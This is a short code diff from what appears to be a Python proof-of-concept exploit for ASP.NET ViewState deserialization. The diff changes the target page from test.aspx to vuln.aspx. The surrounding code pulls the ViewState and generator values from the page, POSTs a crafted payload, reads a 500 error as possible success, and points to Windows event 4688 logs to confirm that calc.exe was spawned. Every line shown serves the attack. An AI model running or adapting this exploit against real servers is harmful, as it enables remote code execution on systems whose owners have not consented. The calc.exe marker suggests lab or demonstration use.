@@ -17,7 +17,7 @@ def get_viewstate_generator(target):
     viewstate_pattern = r'id="__VIEWSTATE"\svalue="(?P<viewstate_b64>[a-zA-Z0-9+=_/]{3,128})"'
     generator_pattern = r'id="__VIEWSTATEGENERATOR"\svalue="(?P<generator_hex>[a-fA-F0-9]{8})"'
     
-    resp = requests.get(f'http://{target}:80/test.aspx')
+    resp = requests.get(f'http://{target}:80/vuln.aspx')
     #Regex match to search for base64 encoded VIEWSTATE string
     viewstate_match = re.search(viewstate_pattern, resp.text)
     generator_match = re.search(generator_pattern, resp.text)
@@ -52,7 +52,7 @@ def send_payload(target, payload, generator):
                "Content-Type": "application/x-www-form-urlencoded"
                }
     
-    resp = requests.post(f"http://{target}:80/test.aspx", headers=headers, data=post_body)
+    resp = requests.post(f"http://{target}:80/vuln.aspx", headers=headers, data=post_body)
     if resp.status_code == 500:
         print("Received 500 Internal Server Error, payload possibly successful")
         print("Check 4688 event logs on target server to see if calc.exe spawned")
